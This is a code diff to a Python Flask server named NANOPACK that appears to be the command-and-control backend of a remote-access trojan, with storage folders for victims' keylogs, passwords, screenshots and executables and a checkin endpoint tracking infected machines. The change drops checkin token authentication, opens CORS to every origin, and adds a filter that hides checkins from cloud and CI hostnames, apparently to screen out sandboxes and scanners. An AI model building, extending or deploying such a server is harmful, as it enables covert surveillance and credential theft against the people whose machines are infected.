@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""NANOPACK server v5.3 — token-gated checkin, CORS allowlist, live status."""
+"""NANOPACK server v5.4 — no token, hostname filter, live status."""
 from flask import Flask, request, jsonify, send_file
 from flask_cors import CORS
 from flask_socketio import SocketIO
@@ -12,12 +12,11 @@ logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
 app.config['MAX_CONTENT_LENGTH'] = 200 * 1024 * 1024
-CORS(app, origins=["http://localhost", "http://127.0.0.1", "https://te-l1hl.onrender.com"])
+CORS(app, origins="*")
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")
 
 DATABASE = os.environ.get('NANOPACK_DB', 'nanopack.db')
 ONLINE_THRESHOLD = 15
-CHECKIN_TOKEN = os.environ.get('NANOPACK_TOKEN', 'np-change-me-8f3a1c')
 BASE_DIR = os.path.abspath(os.path.dirname(__file__))
 for d in ['downloads', 'executables', 'screenshots', 'keylogs', 'passwords', 'uploads']:
     os.makedirs(os.path.join(BASE_DIR, d), exist_ok=True)
@@ -37,6 +36,22 @@ else:
 cipher = Fernet(KEY)
 
 ID_RE = re.compile(r'^[A-Za-z0-9_\-]{6,128}$')
+
+# phantom-host filter: reject ids/hostnames that look like Render/Heroku/CI pods
+PHANTOM_RE = re.compile(r'^(srv-|dpl-|app-|build-|worker-|runner-)', re.IGNORECASE)
+
+
+def _is_phantom(cid, hostname):
+    if not cid:
+        return True
+    if PHANTOM_RE.match(cid):
+        return True
+    if hostname and PHANTOM_RE.match(str(hostname)):
+        return True
+    # Render internal pod hostnames look like srv-dbmv...; also block pure docker hex
+    if hostname and len(str(hostname)) >= 8 and re.match(r'^[a-z]{3,5}-[a-z0-9]{8,}$', str(hostname)):
+        return True
+    return False
 
 
 def _confine(base, *parts):
@@ -137,26 +152,27 @@ def _413(e):
 
 @app.route('/')
 def index():
-    return jsonify(status='online', system='NANOPACK', version='5.3')
+    return jsonify(status='online', system='NANOPACK', version='5.4')
 
 
 @app.route('/api/checkin', methods=['POST'])
 def checkin():
     try:
         data = _body()
-        if data.get('token') != CHECKIN_TOKEN:
-            logger.warning("checkin rejected: bad token from %s", _ip())
-            return jsonify(error='unauthorized'), 401
         cid = data.get('id')
         if not _valid_cid(cid):
             return jsonify(error='bad id'), 400
+        hostname = data.get('hostname') or 'Unknown'
+        if _is_phantom(cid, hostname):
+            logger.warning("checkin rejected phantom: cid=%s host=%s", cid, hostname)
+            return jsonify(error='phantom'), 400
         if _revoked(cid):
             return jsonify(error='revoked'), 403
         conn = get_db()
         c = conn.cursor()
         now = time.time()
         ip = _ip()
-        host = _clip(data.get('hostname') or 'Unknown', 128)
+        host = _clip(hostname, 128)
         c.execute('SELECT * FROM clients WHERE id=?', (cid,))
         ex = c.fetchone()
         if ex:
@@ -199,6 +215,8 @@ def clients():
         c.execute("SELECT * FROM clients ORDER BY last_seen DESC")
         out = []
         for r in c.fetchall():
+            if _is_phantom(r['id'], r['hostname']):
+                continue
             d = now - (r['last_seen'] or 0)
             if d < ONLINE_THRESHOLD:
                 s = 'online' if d < 5 else 'idle'
@@ -538,6 +556,5 @@ def view_shot(sid):
 
 if __name__ == '__main__':
     PORT = int(os.environ.get('PORT', 5000))
-    logger.info("[+] NANOPACK server v5.3 on port %s (db=%s)", PORT, DATABASE)
+    logger.info("[+] NANOPACK server v5.4 on port %s (db=%s)", PORT, DATABASE)
     socketio.run(app, host='0.0.0.0', port=PORT, debug=False, allow_unsafe_werkzeug=True)
-
